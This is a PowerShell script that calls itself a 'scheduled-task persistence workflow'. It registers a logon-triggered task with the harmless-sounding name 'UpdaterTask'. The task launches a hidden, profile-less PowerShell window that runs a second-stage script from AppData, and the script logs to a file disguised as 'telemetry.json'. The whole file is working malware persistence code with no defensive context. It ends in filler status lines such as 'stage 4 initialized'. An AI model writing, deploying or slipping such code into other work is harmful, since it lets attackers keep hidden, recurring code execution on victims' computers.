<#
.SYNOPSIS
    Scheduled-task persistence workflow.

.DESCRIPTION
    Builds a hidden PowerShell action, registers it against a logon
    trigger with conservative settings, then verifies the task and
    records its state in a small report.

.NOTES
    The task runs in the current user context.
#>
$TaskName = "UpdaterTask"
$ScriptPath = "$env:APPDATA\stage2.ps1"
$LogPath = "$env:TEMP\telemetry.json"
$StartDelayMinutes = 33
$ErrorActionPreference = "Stop"

# Diagnostics
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Action builder
function New-StageTaskAction {
    [CmdletBinding()]
    param(
        [string]$TargetScript = ""
    )

    Write-Verbose ("Building action for " + $TargetScript)
    $Argument = "-NoP -WindowStyle Hidden -File `"" + $TargetScript + "`""
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Argument
    return $Action
}

# Registration
function Register-StagePersistence {
    param(
        [string]$TaskName = '',
        [string]$ScriptPath = ''
    )

    $Action = New-StageTaskAction -TargetScript $ScriptPath
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force
    return (Get-ScheduledTask -TaskName $TaskName)
}

try {
    Write-StageLog -Message "Starting scheduled-task stage"
    $TaskObject = Register-StagePersistence -TaskName $TaskName -ScriptPath $ScriptPath
    Write-StageLog -Message ("Task state: " + $TaskObject.State)
}
catch {
    Write-Warning "Scheduled-task workflow failed: $($_.Exception.Message)"
}

$TaskReport = [ordered]@{
    Stage = "scheduled-task"
    TaskName = $TaskName
    ScriptPath = $ScriptPath
    DelayMinutes = $StartDelayMinutes
}
$TaskReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Preparing working directory"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Retry budget remaining"
Write-Verbose "Operation completed"
Write-Verbose "Checking local path"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Starting workflow"
Write-Verbose "Exporting operation report"
Write-Verbose "Collecting host metadata"
Write-Verbose "Inspecting process list"
Write-Verbose "Stage handoff finished"
Write-Output "stage 4 initialized"
Set-Location -Path $env:TEMP
Write-Verbose "stage marker 21 reached"
